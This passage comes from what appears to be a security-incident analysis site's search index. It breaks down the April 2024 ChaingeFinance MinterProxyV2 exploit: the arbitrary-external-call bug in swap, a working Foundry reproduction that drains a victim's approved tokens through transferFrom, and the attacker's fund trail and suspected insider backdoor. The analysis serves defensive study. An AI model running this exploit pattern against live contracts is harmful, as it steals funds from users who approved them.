`delegatecall` appends the last bytes of `msg.data`\n * to the subcall. This makes it safe to use with {ERC2771Context}. Contexts that don't affect the resolution of\n * {_msgSender} are not propagated to subcalls.\n */\nfunction multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {\n    bytes memory context = msg.sender == _msgSender()\n        ? new bytes(0)\n        : msg.data[msg.data.length - _contextSuffixLength():];\n\n    results = new bytes[](data.length);\n    for (uint256 i = 0; i &lt; data.length; i++) {\n        results[i] = Address.functionDelegateCall(address(this), bytes.concat(data[i], context));\n    }\n    return results;\n}\n</code></pre> <p>This implementation ensures that in the <code>delegatecall</code> invocation of <code>multicall</code>, the last 20 bytes are still <code>req.from</code>, correctly identifying the <code>msgSender</code>.</p>"},{"location":"2024/240415_ChaingeFinance/","title":"240415-ChaingeFinance","text":""},{"location":"2024/240415_ChaingeFinance/#attacktx","title":"AttackTx","text":"<p>Using Phalcon to analyze the attack transaction.</p>"},{"location":"2024/240415_ChaingeFinance/#fund-flow","title":"Fund Flow","text":"<p>The fund flow is straightforward; clearly, 0x8a4a is the victim's address that lost funds (an EOA address), while 0x6979 received the profit obtained from the attack (not the same as the attacker address).</p>"},{"location":"2024/240415_ChaingeFinance/#balance-changes","title":"Balance Changes","text":"<p>The balance changes are consistent with the fund flow, involving no other addresses.</p>"},{"location":"2024/240415_ChaingeFinance/#invocation-flow","title":"Invocation Flow","text":"<p>The invocation flow is similarly simple. The attacker merely used the attack contract to continuously call the <code>swap</code> function of the MinterProxyV2 contract, with the target being different tokens, which are the tokens lost by the victim.</p> <p></p> <p>Within the <code>swap</code>, it can be noted that the <code>transferFrom</code> function corresponding to the target token is directly called here, transferring the victim's tokens away.</p> <p>Additionally, there are two more AttackTx, with the same logic, but targeting different tokens.</p>"},{"location":"2024/240415_ChaingeFinance/#vulnerability","title":"Vulnerability","text":"<p>Clearly, the vulnerability exists in the <code>swap</code> function of the MinterProxyV2 contract, allowing the attacker to exploit <code>transferFrom</code> to transfer tokens from the victim that had previously approved the vulnerable contract.</p> <p>The code of the vulnerable function is as follows.</p> <pre><code>function swap(\n    address tokenAddr,\n    uint256 amount,\n    address target,\n    address receiveToken,\n    address receiver,\n    uint256 minAmount,\n    bytes calldata callData,\n    bytes calldata order\n) external payable nonReentrant whenNotPaused {\n    _checkVaultOut(tokenAddr, amount, order);\n    require(\n        target != address(this) &amp;&amp; target != address(0),\n        \"MP: target is invalid\"\n    );\n    require(callData.length &gt; 0, \"MP: calldata is empty\");\n    require(receiveToken != address(0), \"MP: receiveToken is empty\");\n    require(receiver != address(0), \"MP: receiver is empty\");\n    require(minAmount &gt; 0, \"MP: minAmount is empty\");\n\n    uint256 old_balance = _balanceOfSelf(receiveToken);\n    if (tokenAddr == NATIVE) {\n        require(amount == msg.value, \"MP: amount is invalid\");\n        target.functionCallWithValue(\n            callData,\n            amount,\n            \"MP: CallWithValue failed\"\n        );\n    } else {\n        IERC20(tokenAddr).safeTransferFrom(\n            _msgSender(),\n            address(this),\n            amount\n        );\n        if (IERC20(tokenAddr).allowance(address(this), target) &lt; amount) {\n            IERC20(tokenAddr).safeApprove(target, MAX_UINT256);\n        }\n        target.functionCall(callData, \"MP: FunctionCall failed\");\n    }\n\n    uint256 _amountOut = 0;\n\n    uint256 new_balance = _balanceOfSelf(receiveToken);\n    require(\n        new_balance &gt; old_balance,\n        \"MP: receive amount should above zero\"\n    );\n    _amountOut = new_balance - old_balance;\n\n    require(_amountOut &gt;= minAmount, \"MP: receive amount not enough\");\n    if (receiveToken == NATIVE) {\n        TransferHelper.safeTransferNative(receiver, _amountOut);\n    } else {\n        IERC20(receiveToken).safeTransfer(receiver, _amountOut);\n    }\n\n    _orderID++;\n    emit LogVaultOut(\n        receiveToken,\n        _msgSender(),\n        _orderID,\n        _amountOut,\n        receiver,\n        order\n    );\n}\n\nfunction _checkVaultOut(\n    address tokenAddr,\n    uint256 amount,\n    bytes calldata order\n) internal pure {\n    require(tokenAddr != address(0), \"MP: tokenAddress is invalid\");\n    require(amount &gt; 0, \"MP: amount is 0\");\n    require(order.length &gt; 0, \"MP: order is empty\");\n}\n</code></pre> <p>It can be noted that since both target and callData are parameters passed to the <code>swap</code> function, they can be arbitrarily specified, leading to the arbitrary external call vulnerability in the following code.</p> <pre><code>target.functionCallWithValue(\n            callData,\n            amount,\n            \"MP: CallWithValue failed\"\n        );\ntarget.functionCall(callData, \"MP: FunctionCall failed\");\n</code></pre> <p>Since both the target of the call and the parameters are controllable, for any victim that has approved the vulnerable contract (especially with unlimited approval), the attacker can pass parameters to call the <code>transferFrom</code> function and obtain all tokens corresponding to the victim.</p>"},{"location":"2024/240415_ChaingeFinance/#exploit","title":"Exploit","text":""},{"location":"2024/240415_ChaingeFinance/#reproduce","title":"Reproduce","text":"<p>Combining the three AttackTx from the attacker, the exploit can be derived as follows.</p> <pre><code>function testExploit() public {\n    uint attackBlockNumber = 37880387;\n    vm.rollFork(attackBlockNumber);\n\n    address[12] memory targetToken = [\n        address(usdt),\n        address(sol),\n        address(AVAX),\n        address(babydoge),\n        address(FOLKI),\n        address(ATOM),\n        address(TLOS),\n        address(IOTX),\n        address(linch),\n        address(link),\n        address(btcb),\n        address(eth)\n    ];\n\n    for (uint i = 0; i &lt; targetToken.length; i++) {\n        _attack(targetToken[i]);\n    }\n}\n\nfunction _attack(address targetToken) private {\n    uint256 Balance = IERC20(targetToken).balanceOf(victim);\n    uint256 Allowance = IERC20(targetToken).allowance(victim, address(minterproxy));\n    uint256 amount = Balance &lt; Allowance ? Balance : Allowance;\n    if (amount == 0) {\n        emit log_named_string(\"No allowed targetToken\", IERC20(targetToken).name());\n        return;\n    }\n    bytes memory transferFromData = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victim, address(this), amount);\n    minterproxy.swap(address(this), 1, targetToken, address(this), address(this), 1, transferFromData, bytes(hex\"00\"));\n    emit log_named_string(\"targetToken\", IERC20(targetToken).name());\n    emit log_named_decimal_uint(\"profit\", IERC20(targetToken).balanceOf(address(this)), IERC20(targetToken).decimals());\n}\n\nfunction balanceOf(address /*account*/) external view returns (uint256) {\n    return balance;\n}\n\nfunction transfer(address /*recipient*/, uint256 /*amount*/) external pure returns (bool) {\n    return true;\n}\n\nfunction allowance(address /*_owner*/, address /*spender*/) external pure returns (uint256) {\n    return type(uint256).max;\n}\n\nfunction approve(address /*spender*/, uint256 /*amount*/) external pure returns (bool) {\n    return true;\n}\n\nfunction transferFrom(address /*sender*/, address /*recipient*/, uint256 amount) external returns (bool) {\n    balance += amount;\n    return true;\n}\n</code></pre> <p>According to the logic of the original <code>swap</code> function, the attack contract itself also needs to act as a fake token, implementing the relevant ERC20 interfaces.</p>"},{"location":"2024/240415_ChaingeFinance/#attack-flow","title":"Attack Flow","text":"<p>Analyze the entire attack flow of the attacker address.</p> <p></p> <p>On January 20, approximately 0.28 BNB was transferred in via SWFTSwap.</p> <p></p> <p>Then, on April 5, the attack contract for the attack was created.</p> <p>Ten days later, three AttackTx were sequentially initiated using the attack contract, exploiting the vulnerability of the MinterProxyV2 contract, taking away various tokens from the victim, which were stored in the profitToAddress.</p> <p>Six days later, on April 21, the attacker transferred the remaining BNB to the profitToAddress.</p> <p></p> <p>On the same day, all tokens were sold for USDT.</p> <p></p> <p>Finally, five months later, on September 22, all the obtained USDT was transferred out to 0x66ff.</p>"},{"location":"2024/240415_ChaingeFinance/#misc","title":"Misc","text":""},{"location":"2024/240415_ChaingeFinance/#premeditated-attack","title":"Premeditated Attack","text":"<p>It can be noted that the vulnerable contract was created on April 11, while the attacker created the attack contract on April 5.</p> <p></p> <p>Reviewing the transaction history of the creator of MinterProxyV2, it can be found that several similar vulnerable MinterProxyV2 contracts had already been created before. Therefore, this attack was premeditated.</p> <p></p> <p>By examining the victim's transaction history, it can be observed that on April 15 at 9 AM, the victim batch-approved various tokens for the vulnerable contract. The attacker likely observed this and then initiated the attack two hours later.</p>"},{"location":"2024/240415_ChaingeFinance/#copycat","title":"Copycat","text":"<p>In addition to the aforementioned attacker, another attacker 0xacdb also initiated a similar attack approximately one hour after the first attacker.</p> <p></p> <p>They also exploited the vulnerability of the MinterProxyV2 contract to take away the remaining tokens from the same victim.</p>"},{"location":"2024/240415_ChaingeFinance/#response","title":"Response","text":"<p>By examining the historical transactions of the creator of the vulnerable contract, it can be inferred that the contract belongs to the ChaingeFinance project.</p> <p></p> <p>The vulnerable contract was subsequently paused by the team to prevent further exploitation, coincidentally, the pause transaction and the copycat's attack transaction occurred in the same block, one before the other.</p> <p></p> <p>Afterwards, the project team deployed a new MinterProxyV2 contract on the same day and the next day. The contract 0x99a5 is still in use today, and the victim address 0x8a4a continues to approve tokens related to the new contract.</p> <p>Interestingly, comparing the new contract with the original contract shows that the previously vulnerable <code>swap</code> function has been removed directly.</p>"},{"location":"2024/240415_ChaingeFinance/#other-chains","title":"Other Chains","text":"<p>In fact, on other chains (such as Ethereum mainnet and Arbitrum), the project team used the same address to deploy related contracts, including the vulnerable MinterProxyV2 contract.</p> <p></p> <p>For example, on the mainnet, the vulnerable contract 0x43e9 was also created on April 11 and was paused by the Chainge team on April 15 at 12 PM, the day of the attack.</p> <p></p> <p>Similarly, the victim address 0x8a4a approved many tokens for the vulnerable contract on April 15 at 9 AM.</p> <p>Therefore, there is also a possibility of attacks on other chains, although it seems that no attacks occurred.</p>"},{"location":"2024/240415_ChaingeFinance/#backdoor","title":"Backdoor?","text":"<p>As the only victim in the attack, 0x8a4a should belong to the project team\u2019s account and was set as liquidpool in the vulnerable contract MinterProxyV2.</p> <p>Furthermore, the first attacker ultimately transferred the profits to 0x66ff.</p> <p></p> <p>This address is still active as of this writing, and suspiciously, since September 5, it has also approved a large number of tokens to the new MinterProxyV2 contract 0x99a5, similar to the behavior of the previous victim.</p> <p></p> <p>Moreover, examining Token Transfers reveals that this address participated in related operations of MinterProxyV2.</p> <p></p> <p>Reviewing the still-used MinterProxyV2 contract, it can be noted that it has also been set as liquidpool.</p> <p>Given the above analysis, there is reason to suspect that the earlier April attack was perpetrated by internal personnel of the team, and the vulnerable <code>swap</code> function was left as a backdoor.</p>"}]}